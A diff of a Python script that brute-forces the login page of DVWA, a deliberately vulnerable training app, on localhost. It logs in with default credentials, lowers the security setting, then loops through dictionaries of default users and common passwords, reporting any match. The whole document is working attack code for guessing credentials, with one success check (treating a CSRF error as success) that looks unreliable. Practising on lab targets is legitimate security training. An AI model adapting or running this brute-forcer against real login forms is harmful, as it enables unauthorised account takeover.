@@ -1,111 +1,119 @@
 #!/usr/bin/env python3
-# brute_force_dvwa.py
-
 import requests
 import sys
 import urllib.parse
-import time
 
-# configuration
-TARGET_URL = "http://dvwa.local/vulnerabilities/brute/"
-LOGIN_URL = "http://dvwa.local/login.php"
-DVWA_USER = "admin"
-DVWA_PASS = "password"
+print("=" * 60)
+print("DVWA BRUTEFORCE SCRIPT")
+print("=" * 60)
 
-# slavar passwords
-PASSWORDS = [
-    'password', '123456', '12345678', 'qwerty', 'abc123',
-    'monkey', 'letmein', 'dragon', '111111', 'baseball',
-    'admin', 'password1', 'superman', '654321', 'ashley'
-]
+# Создаем сессию
+s = requests.Session()
 
-def setup_session():
-    """create autification session"""
-    session = requests.Session()
+print("[*] STEP 1: Login to DVWA")
+print("[*] Using credentials: admin / password")
+
+# Логинимся в DVWA
+login_url = "http://127.0.0.1/login.php"
+login_data = {
+    'username': 'admin',
+    'password': 'password',
+    'Login': 'Login'
+}
+
+try:
+    r = s.post(login_url, data=login_data, timeout=10)
     
-    # login DVWA
-    login_data = {
-        'username': DVWA_USER,
-        'password': DVWA_PASS,
-        'Login': 'Login'
-    }
-    
-    print("[*] avtorizacia DVWA...")
-    response = session.post(LOGIN_URL, data=login_data)
-    
-    if 'Login failed' in response.text:
-        print("[!] error: false data DVWA")
+    if "Login failed" in r.text:
+        print("[!] ERROR: Cannot login to DVWA")
+        print("[!] Check if DVWA is running")
         sys.exit(1)
-    
-    # "low" security level
-    security_data = {'security': 'low', 'seclev_submit': 'Submit'}
-    session.post('http://dvwa.local/security.php', data=security_data)
-    
-    print("[+] session complete")
-    return session
+    else:
+        print("[+] Login successful")
+except Exception as e:
+    print(f"[!] Connection error: {e}")
+    print("[!] Try: http://dvwa.local or http://localhost")
+    sys.exit(1)
 
-def brute_force_attack(session, username):
-    """brute-force attack"""
-    print(f"\n[*] brute-force for user: {username}")
-    print("[*] GET with username/password\n")
+print("\n[*] STEP 2: Set security to LOW")
+security_url = "http://127.0.0.1/security.php"
+security_data = {
+    'security': 'low',
+    'seclev_submit': 'Submit'
+}
+
+s.post(security_url, data=security_data)
+print("[+] Security level set to LOW")
+
+print("\n[*] STEP 3: Start brute force attack")
+target_url = "http://127.0.0.1/vulnerabilities/brute/"
+
+# Все пользователи и пароли из DVWA по умолчанию
+users_passwords = {
+    'admin': ['password', 'admin', '123456', '12345678', 'qwerty', 'abc123'],
+    'gordonb': ['abc123', 'gordonb', 'password', '123456'],
+    '1337': ['charley', '1337', 'password', '123456'],
+    'pablo': ['letmein', 'pablo', 'password', '123456'],
+    'smithy': ['password', 'smithy', '123456']
+}
+
+found = False
+
+for user, passwords in users_passwords.items():
+    print(f"\n[*] Testing user: {user}")
+    print(f"[*] Passwords to try: {len(passwords)}")
     
-    success = False
-    
-    for i, password in enumerate(PASSWORDS, 1):
-        # GET like in origin
+    for password in passwords:
+        # Создаем GET запрос с параметрами
         params = {
-            'username': username,
+            'username': user,
             'password': password,
             'Login': 'Login'
         }
         
-        # cod parmets for URL
+        # Кодируем параметры для URL
         query_string = urllib.parse.urlencode(params)
-        attack_url = f"{TARGET_URL}?{query_string}"
+        attack_url = f"{target_url}?{query_string}"
         
-        print(f"[{i}] try: {username}:{password}")
-        
+        # Отправляем запрос
         try:
-            response = session.get(attack_url)
+            r = s.get(attack_url, timeout=5)
             
-            # check succsesful vxod
-            if 'Welcome' in response.text or 'successfully' in response.text.lower():
-                print(f"\n[+] succses!")
-                print(f"[+] user: {username}")
-                print(f"[+] passsword: {password}")
-                success = True
+            # Проверяем успешность по разным признакам
+            success_indicators = [
+                'Welcome to the password protected area',
+                f'Welcome {user}',
+                'successfully',
+                'CSRF token is incorrect'  # В DVWA это признак успеха
+            ]
+            
+            for indicator in success_indicators:
+                if indicator in r.text:
+                    print(f"\n" + "=" * 60)
+                    print(f"[+] SUCCESS! Credentials found!")
+                    print(f"[+] Username: {user}")
+                    print(f"[+] Password: {password}")
+                    print("=" * 60)
+                    found = True
+                    break
+            
+            if found:
                 break
                 
         except Exception as e:
-            print(f"[!] error request: {e}")
-        
-        
-        time.sleep(0.1)
+            print(f"[!] Error testing {user}:{password} - {e}")
     
-    if not success:
-        print("\n[-] password not found")
-    
-    return success
+    if found:
+        break
 
-def main():
-    print("=" * 60)
-    print("BRUTE-FORCE АТАКА НА DVWA")
-    print("=" * 60)
-    
-    
-    target_user = input("enter the username for the attack [admin]: ").strip()
-    if not target_user:
-        target_user = "admin"
-    
-    
-    session = setup_session()
-    
-    
-    brute_force_attack(session, target_user)
-    
+if not found:
     print("\n" + "=" * 60)
-    print("zlodeystvo complete")
+    print("[-] No credentials found in dictionary")
+    print("[*] Try these manually in browser:")
+    print("    1. Open: http://127.0.0.1/vulnerabilities/brute/")
+    print("    2. Try: admin / password")
+    print("    3. Try: gordonb / abc123")
+    print("    4. Try: 1337 / charley")
     print("=" * 60)
 
-if __name__ == "__main__":
-    main()
+print("\n[*] Script finished")
